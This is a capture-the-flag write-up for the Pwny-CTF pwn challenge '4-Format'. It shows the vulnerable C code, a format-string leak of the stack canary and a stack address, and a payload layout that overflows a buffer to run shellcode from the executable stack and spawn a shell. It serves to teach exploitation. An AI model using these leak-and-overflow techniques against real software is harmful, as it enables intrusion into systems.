---
title: "4-Format"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 350
techniques: ["format-string", "buffer-overflow", "shellcode", "stack-canary", "pie-bypass", "nx-bypass"]
tools: ["gdb", "checksec", "netcat", "python"]
keywords: ["4-Format", "Pwny-CTF", "pwn", "format-string", "buffer-overflow", "shellcode", "stack-canary", "pie-bypass", "nx-bypass", "gdb", "checksec", "netcat", "python", "canary", "pie", "padding"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/PWN-II/4-Format/notes.md"
---

# 4-Format (Pwny-CTF, pwn)

## Summary
Challenge **4-Format** from the Pwny-CTF CTF, pwn category. Main technique: format-string. Canary + format string + executable stack -> the winning combo: the FSB leaks the canary AND a stack address, then the overflow replays the canary intact and redirects ret to the shellcode.

## Statement and artefacts
Can you pwn this problem? Look at the challenge.c and pwn writeup for hints!

`nc chal.sigpwny.com 1391`

**author**: Sam

**Provided files / artifacts:**
- `work/Dockerfile (file, 629 B)`
- `work/Makefile (file, 119 B)`
- `work/challenge (file, 18.7 KB)`
- `work/challenge_patched (file, 18.7 KB)`

## Recognition signals
- If we observe NX: No (-z execstack), think of executable stack -> shellcode on the OK stack.
- Signal: Canary: Yes -> you have to leak it and rewrite it identically (otherwise __stack_chk_fail).
- Signal: PIE: No -> fixed address binary, but stack remains randomized -> need stack address leak.
- Signal: The printf(name) is used to leak, the fgets(place, 64) to overflow and overwrite the return address.

## Resolution method
1. **Step 1 — Leak via printf(name)**

- `name` is the **6th argument** of the format string (found with `offset_browser`).
- Counting in gdb: the **canary** is at **15ᵉ**, a **stack address** at **16ᵉ**.
- Leaked payload: `%15$p.%16$p` →
  - `canary = leak[0]` (large value ending with `00`),
  - `name_addr = leak[1] - 0x40` (constant offset between the leaked address and the start of the buffer where the shellcode will go; verified stable over several runs in gdb).

2. **Step 2 — Overflow via fgets(place, 64) (ret2shellcode)**

```
payload = shellcode(23o)
        + b"A"*(40 - 23)     # padding up to the canary (offset 40)
        + p64(canary)        # canary REWRITE identically -> pass the check
        + b"A"*8             # saved rbp
        + p64(name_addr)     # return address = start of shellcode
```
- The shellcode is at **start of 2nd entry** (`place`); `name_addr` (= leak−0x40) points to it.
- At `ret`, the CPU jumps to shellcode (executable stack) → `execve("/bin/sh")` → shell → `cat flag.txt`.

See `work/pwny.py`. Continuation: `sla("name?", "%15$p.%16$p")` → parse canary + addr → `sl(shellcode + pad + canary + rbp + ret)` → `interactive()`.

3. **Protections (checksec)**

- **NX: No** (`-z execstack`) → **executable stack** → shellcode on stack OK.
- **Canary: Yes** → it must be **leaked** and **rewritten identically** (otherwise `__stack_chk_fail`).
- **PIE: No** → binary with fixed addresses, but the **stack remains randomized** → need a **stack address leak**.

4. **Flaw**

```c
char name[32], place[32];
fgets(name, 64, stdin);   // (1) input
printf(name);             // (2) FORMAT STRING BUG -> leak (%p)
fgets(place, 64, stdin);  // (3) input -> OVERFLOW (64 > 32)
```
The `printf(name)` is used to **leak**, the `fgets(place, 64)` to **overflow** and overwrite the return address.

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{printf_does_exactly_as_told_and_nothing_more}

## Lessons and reusable patterns
- Canary + format string + executable stack -> the winning combo: the FSB leaks the canary AND a stack address, then the overflow replays the canary intact and redirects ret to the shellcode.
- %N$p = read the Nth argument directly (cleaner than %p %p %p…). Find N with offset_browser (marker AAAAAAAA -> search for 0x4141414141414141).
- The canary is recognized: large value, low byte 00, changes with each run.
- Leak->buffer offset: check over 2-3 executions (gdb) that it is constant before hardcoding it.
- fgets(buf, 64) reads 63 bytes + \0: the most significant bytes of a stack address (00 00) at the end of the payload are harmless.
